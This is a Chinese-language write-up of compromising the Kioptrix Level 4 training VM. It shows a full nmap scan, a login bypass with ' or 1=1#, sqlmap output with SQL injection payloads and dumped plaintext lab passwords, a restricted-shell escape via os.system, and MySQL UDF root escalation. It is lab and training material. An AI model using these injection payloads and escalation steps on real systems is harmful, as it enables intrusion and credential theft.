---
# 这是页面的图标
icon: api
# 这是文章的标题
title: 靶机 KIOPTRIX:LEVEL 4 Walkthrough
# 设置作者
author: lhz
# 设置写作时间
time: 2022-03-24
# 一个页面只能有一个分类
category: 渗透
# 一个页面可以有多个标签
tag:
  - 渗透
  - 靶机
comment: false

typora-root-url: ..\..\..\.vuepress\public
---



扫描ip

![image-20220421172327093](/assets/img/image-20220421172327093.png)

扫描目标

```bash
└─# nmap -T5 -A -v -p- 192.168.197.131
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-22 06:58 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 06:58
Completed NSE at 06:58, 0.00s elapsed
Initiating NSE at 06:58
Completed NSE at 06:58, 0.00s elapsed
Initiating NSE at 06:58
Completed NSE at 06:58, 0.00s elapsed
Initiating ARP Ping Scan at 06:58
Scanning 192.168.197.131 [1 port]
Completed ARP Ping Scan at 06:58, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:58
Completed Parallel DNS resolution of 1 host. at 06:58, 13.01s elapsed
Initiating SYN Stealth Scan at 06:58
Scanning 192.168.197.131 [65535 ports]
Discovered open port 139/tcp on 192.168.197.131
Discovered open port 445/tcp on 192.168.197.131
Discovered open port 22/tcp on 192.168.197.131
Discovered open port 80/tcp on 192.168.197.131
Completed SYN Stealth Scan at 06:58, 12.04s elapsed (65535 total ports)
Initiating Service scan at 06:58
Scanning 4 services on 192.168.197.131
Completed Service scan at 06:58, 11.02s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 192.168.197.131
NSE: Script scanning 192.168.197.131.
Initiating NSE at 06:58
Completed NSE at 06:59, 15.15s elapsed
Initiating NSE at 06:59
Completed NSE at 06:59, 0.00s elapsed
Initiating NSE at 06:59
Completed NSE at 06:59, 0.00s elapsed
Nmap scan report for 192.168.197.131
Host is up (0.0011s latency).
Not shown: 39528 closed tcp ports (reset), 26003 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
MAC Address: 00:0C:29:E2:9B:4B (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Uptime guess: 497.103 days (since Tue Nov 10 03:30:53 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=203 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 9h59m59s, deviation: 2h49m42s, median: 7h59m59s
| nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KIOPTRIX4<00>        Flags: <unique><active>
|   KIOPTRIX4<03>        Flags: <unique><active>
|   KIOPTRIX4<20>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|_  WORKGROUP<00>        Flags: <group><active>
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|_  System time: 2022-03-22T14:58:46-04:00

TRACEROUTE
HOP RTT     ADDRESS
1   1.14 ms 192.168.197.131

NSE: Script Post-scanning.
Initiating NSE at 06:59
Completed NSE at 06:59, 0.00s elapsed
Initiating NSE at 06:59
Completed NSE at 06:59, 0.00s elapsed
Initiating NSE at 06:59
Completed NSE at 06:59, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.95 seconds
           Raw packets sent: 91561 (4.030MB) | Rcvd: 39547 (1.582MB)
```

浏览器访问

![image-20220421172344137](/assets/img/image-20220421172344137.png)

使用admin，万能密码' or 1=1#登录

![image-20220421172349414](/assets/img/image-20220421172349414.png)

发现存在sql注入，使用sqlmap

```bash
sqlmap -u "http://192.168.197.131/checklogin.php" --data "myusername=john&mypassword=123&Submit=Login" -p mypassword --dump 
```

扫描结果

```
┌──(root💀kali)-[/home/kali]
└─# sqlmap -u "http://192.168.197.131/checklogin.php" --data "myusername=john&mypassword=123&Submit=Login" -p mypassword --dump    
        ___
       __H__                                                                 
 ___ ___["]_____ ___ ___  {1.5.11#stable}                                    
|_ -| . [(]     | .'| . |                                                    
|___|_  [(]_|_|_|__,|  _|                                                    
      |_|V...       |_|   https://sqlmap.org                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:29:50 /2022-03-22/

[21:29:50] [INFO] resuming back-end DBMS 'mysql' 
[21:29:50] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: mypassword (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: myusername=john&mypassword=-7681' OR 7710=7710#&Submit=Login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: myusername=john&mypassword=123' AND (SELECT 4970 FROM (SELECT(SLEEP(5)))HCsb)-- ztBx&Submit=Login
---
[21:29:50] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: Apache 2.2.8, PHP 5.2.4
back-end DBMS: MySQL >= 5.0.12
[21:29:50] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[21:29:50] [INFO] fetching current database
[21:29:50] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[21:29:50] [INFO] retrieved: 
got a 302 redirect to 'http://192.168.197.131:80/login_success.php?username=john'. Do you want to follow? [Y/n] 
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] 
members
[21:29:55] [INFO] fetching tables for database: 'members'
[21:29:55] [INFO] fetching number of tables for database 'members'
[21:29:55] [INFO] retrieved: 1
[21:29:55] [INFO] retrieved: members
[21:29:56] [INFO] fetching columns for table 'members' in database 'members'
[21:29:56] [INFO] retrieved: 3
[21:29:56] [INFO] retrieved: id
[21:29:57] [INFO] retrieved: username
[21:29:57] [INFO] retrieved: password
[21:29:59] [INFO] fetching entries for table 'members' in database 'members'
[21:29:59] [INFO] fetching number of entries for table 'members' in database 'members'
[21:29:59] [INFO] retrieved: 2
[21:29:59] [INFO] retrieved: 1                                                                                                                                                                                
[21:29:59] [INFO] retrieved: MyNameIsJohn                                                                                                                                                                     
[21:30:01] [INFO] retrieved: john                                                                                                                                                                             
[21:30:01] [INFO] retrieved: 2                                                                                                                                                                                
[21:30:02] [INFO] retrieved: ADGAdsafdfwt4gadfga==                                                                                                                                                            
[21:30:04] [INFO] retrieved: robert                                                                                                                                                                           
Database: members                                                                                                                                                                                             
Table: members                                                                                                                                                                                                
[2 entries]                                                                                                                                                                                                   
+----+-----------------------+----------+                                                                                                                                                                     
| id | password              | username |                                                                                                                                                                     
+----+-----------------------+----------+                                                                                                                                                                     
| 1  | MyNameIsJohn          | john     |                                                                                                                                                                     
| 2  | ADGAdsafdfwt4gadfga== | robert   |                                                                                                                                                                     
+----+-----------------------+----------+                                                                                                                                                                     
                                                                                                                                                                                                              
[21:30:05] [INFO] table 'members.members' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.197.131/dump/members/members.csv'                                                                      
[21:30:05] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.197.131'                                                                                                  
                                                                                                                                                                                                              
[*] ending @ 21:30:05 /2022-03-22/ 
```

发现两个用户名和密码，尝试ssh连接

![image-20220421172358647](/assets/img/image-20220421172358647.png)

连接成功，可执行的命令很少，明显不是root权限，是一个受限的shell，Restricted Shell

搜一下Restricted Shell的绕过的一些方法，使用`echo os.system("/bin/bash")` 获取更多命令执行权限

尝试一些越权方法没有成功，考虑到sql注入，再看mysql，查看运行的账户是root

![image-20220421172404792](/assets/img/image-20220421172404792.png)

再去web项目中查看代码，发现root账户不存在密码

![image-20220421172409452](/assets/img/image-20220421172409452.png)

连接mysql, 考虑mysql UDF提权，查看lib_mysqludf_sys.so 文件存在，满足udf提权需求

![image-20220421172415270](/assets/img/image-20220421172415270.png)

![image-20220421172419632](/assets/img/image-20220421172419632.png)

![image-20220421172424068](/assets/img/image-20220421172424068.png)

提权成功

![image-20220421172429205](/assets/img/image-20220421172429205.png)

使用另外一种也可以

![image-20220421172434086](/assets/img/image-20220421172434086.png)



mysql 提权参考：

https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html

https://www.sqlsec.com/2020/11/mysql.html

https://xz.aliyun.com/t/10373
